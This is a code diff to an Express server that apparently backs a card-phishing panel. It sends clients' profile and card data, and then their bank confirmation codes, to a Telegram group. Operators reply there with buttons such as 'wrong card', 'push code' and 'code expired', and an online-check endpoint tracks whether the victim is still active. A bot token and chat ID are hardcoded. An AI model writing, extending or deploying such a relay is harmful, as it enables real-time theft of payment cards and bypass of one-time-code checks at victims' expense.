@@ -1,6 +1,5 @@
 require("dotenv").config();
 
-
 const express = require("express");
 const cors = require("cors");
 const { v4: uuidv4 } = require("uuid");
@@ -8,7 +7,6 @@ const { v4: uuidv4 } = require("uuid");
 const app = express();
 app.use(express.json());
 app.use(cors({ origin: "*" }));
-
 
 const BOT_TOKEN     = (process.env.BOT_TOKEN     || "8348466548:AAGR3Jss48lkie_jgqNAguABE5mNMjom0dU").trim();
 const GROUP_CHAT_ID = (process.env.GROUP_CHAT_ID  || "-5278623594").trim();
@@ -20,6 +18,8 @@ const SELF_URL = (process.env.SELF_URL || `http://localhost:${PORT}`).replace(/\
 const TIMEOUT_MS = 10 * 60 * 1000;
 
 const pending = new Map();
+
+const lastSeen = new Map();
 
 
 async function tgPost(method, body) {
@@ -39,6 +39,50 @@ async function tgPost(method, body) {
     );
   }
   return json;
+}
+
+function orderKeyboard(request_id) {
+  return {
+    inline_keyboard: [
+      [
+        { text: "✅ Подтвердить",      callback_data: `${request_id}:ok`           },
+        { text: "❌ Не подходит",      callback_data: `${request_id}:nope`         },
+      ],
+      [
+        { text: "⚠️ Неверная карта",   callback_data: `${request_id}:wrong`        },
+        { text: "🚫 Инвалид карта",    callback_data: `${request_id}:invalid`      },
+      ],
+      [
+        { text: "📲 Пуш код",          callback_data: `${request_id}:push_code`    },
+        { text: "🔄 Смена карты",      callback_data: `${request_id}:change_card`  },
+      ],
+      [
+        { text: "❗ Неверный код",     callback_data: `${request_id}:wrong_code`   },
+        { text: "⏰ Код истёк",        callback_data: `${request_id}:expired_code` },
+      ],
+      [
+        { text: "👁 Проверка онлайна", callback_data: `${request_id}:check_online` },
+      ],
+    ],
+  };
+}
+
+function codeKeyboard(request_id) {
+  return {
+    inline_keyboard: [
+      [
+        { text: "✅ Код верный",       callback_data: `${request_id}:ok`           },
+        { text: "❗ Неверный код",     callback_data: `${request_id}:wrong_code`   },
+      ],
+      [
+        { text: "⏰ Код истёк",        callback_data: `${request_id}:expired_code` },
+        { text: "📲 Новый пуш",        callback_data: `${request_id}:push_code`    },
+      ],
+      [
+        { text: "👁 Проверка онлайна", callback_data: `${request_id}:check_online` },
+      ],
+    ],
+  };
 }
 
 async function sendOrderToTelegram({
@@ -64,13 +108,18 @@ async function sendOrderToTelegram({
   await tgPost("sendMessage", {
     chat_id: GROUP_CHAT_ID,
     text: lines.join("\n"),
-    reply_markup: {
-      inline_keyboard: [[
-        { text: "✅ Подтвердить",      callback_data: `${request_id}:ok`    },
-        { text: "❌ Не подходит",      callback_data: `${request_id}:nope`  },
-        { text: "⚠️ Неверные данные", callback_data: `${request_id}:wrong` },
-      ]],
-    },
+    reply_markup: orderKeyboard(request_id),
+  });
+}
+
+async function sendCodeToTelegram({ request_id, code }) {
+  if (!GROUP_CHAT_ID) throw new Error("GROUP_CHAT_ID is not set");
+
+  await tgPost("sendMessage", {
+    chat_id: GROUP_CHAT_ID,
+    text: `🔐 Код подтверждения от клиента\n\n📋 Код: <b>${code}</b>\n🆔 Заявка: ${request_id}`,
+    parse_mode: "HTML",
+    reply_markup: codeKeyboard(request_id),
   });
 }
 
@@ -83,7 +132,6 @@ function waitForCallback(request_id) {
     pending.set(request_id, { resolve, timer });
   });
 }
-
 
 app.post("/api/order", async (req, res) => {
   const { profile = {}, card = {}, amount = "" } = req.body;
@@ -117,6 +165,7 @@ app.post("/api/order", async (req, res) => {
     });
   }
 
+  lastSeen.set(request_id, Date.now());
   console.log(`[order] waiting  request_id=${request_id}`);
   const result = await waitForCallback(request_id);
 
@@ -129,6 +178,35 @@ app.post("/api/order", async (req, res) => {
   res.json({ ok: true, request_id, action: result.action });
 });
 
+app.post("/api/code", async (req, res) => {
+  const { request_id, code } = req.body || {};
+  if (!request_id || !code) {
+    return res.status(400).json({ ok: false, error: "request_id and code are required" });
+  }
+
+  try {
+    await sendCodeToTelegram({ request_id, code });
+  } catch (err) {
+    console.error("[code] Telegram error:", err.message);
+    return res.status(502).json({
+      ok: false,
+      error: "Telegram unavailable",
+      detail: err.message,
+    });
+  }
+
+  lastSeen.set(request_id, Date.now());
+  console.log(`[code] waiting  request_id=${request_id}`);
+  const result = await waitForCallback(request_id);
+
+  if (result.timeout) {
+    console.log(`[code] timeout  request_id=${request_id}`);
+    return res.status(408).json({ ok: false, error: "timeout" });
+  }
+
+  console.log(`[code] done  request_id=${request_id}  action=${result.action}`);
+  res.json({ ok: true, request_id, action: result.action });
+});
 
 app.post("/api/callback", (req, res) => {
   const { request_id, action } = req.body || {};
@@ -144,6 +222,15 @@ app.post("/api/callback", (req, res) => {
   }
 
   res.json({ ok: true });
+});
+
+app.get("/api/online", (req, res) => {
+  const { request_id } = req.query;
+  const hasPending = pending.has(request_id);
+  const ts = lastSeen.get(request_id);
+  const recentlyActive = ts && (Date.now() - ts < 5 * 60 * 1000);
+  const online = hasPending || !!recentlyActive;
+  res.json({ ok: true, online });
 });
 
 app.get("/health", (_req, res) =>
